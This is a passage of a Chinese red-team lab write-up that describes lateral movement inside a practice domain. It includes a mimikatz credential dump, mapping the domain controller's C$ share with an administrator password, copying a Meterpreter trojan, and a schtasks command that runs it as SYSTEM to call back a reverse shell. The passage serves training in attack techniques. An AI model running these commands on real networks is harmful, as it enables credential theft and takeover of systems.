+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202121752.png"><br>然后使用proxychains连接他的3389(cyshack用户登录)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Proxychains rdesktop 192.168.52.141 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202215105.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202222526.png"></p>
+<hr>
+<h1 id="走向win2008-C盘共享传马"><a href="#走向win2008-C盘共享传马" class="headerlink" title="走向win2008(C盘共享传马)"></a>走向win2008(C盘共享传马)</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qwerzxcvb123/article/details/105215372/">msf攻击win2008实例</a></p>
+<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描版本信息：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202624260.png"><br>Nmap：开启了135 和445 , 3389未开启</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202730388.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202736706.png"><br>永恒之蓝和135端口漏洞都失败  放弃漏洞</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202753303.png"><br>使用命令：可添加用户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br></pre></td></tr></table></figure>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203010112.png"></p>
+<hr>
+<h2 id="另辟蹊径"><a href="#另辟蹊径" class="headerlink" title="另辟蹊径"></a>另辟蹊径</h2><p>win7中得到域内用户密码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203102841.png"><br>这里利用 win7 向域控传一个msf马，并让域控中的马<code>定时开启</code>然后我们只需要在kali<code>设置监听</code>即可</p>
+<p>生成马：(设置反弹shell到win7的9999端口)</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203212724.png"><br>先win7连接域控的c盘共享</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(shell) net use \\192.168.52.138\c$ &quot;cys121&#96;&quot; &#x2F;user:&quot;administrator&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查看域控的c盘资源：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(shell) dir \\192.168.52.138\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203329590.png"><br>说明成功</p>
+<p>上传msf马到win7:</p>
+<p>(win7 meterpreter) upload </p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203405657.png"><br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203415382.png"><br>将win7的马共享给域控：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(shell) copy c:\Windows\System32\cyshoumen.exe \\192.168.52.138\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203448363.png"><br>看到域控：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203457791.png"><br>设置一个任务计划，定时启动木马：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;tn &quot;test&quot; &#x2F;tr C:\cyshoumen.exe &#x2F;sc once &#x2F;st 22:14 &#x2F;S 192.168.52.138 &#x2F;RU System &#x2F;u administrator &#x2F;p &quot;cys121&#96;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322203529642.png"><br>设置监听：此时应该监听win7的9999端口</p>
+<p>到时间点之后会反弹shell：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032220361174.png"><br>拿下</p>
+<hr>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Ekko-z/p/12991730.html">好文章1</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/rlenew/article/details/104456386">好文章2</a><br><a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/172136">好文章3</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%83%EF%BC%89/" rel="prev" title="ATT&CK红队评估实战靶场（七）">
+                  <i class="fa fa-angle-left"></i> ATT&CK红队评估实战靶场（七）
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/25/cmd%20%E7%8E%AF%E5%A2%83%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/" rel="next" title="cmd 环境下载文件的几种方法">
+                  cmd 环境下载文件的几种方法 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
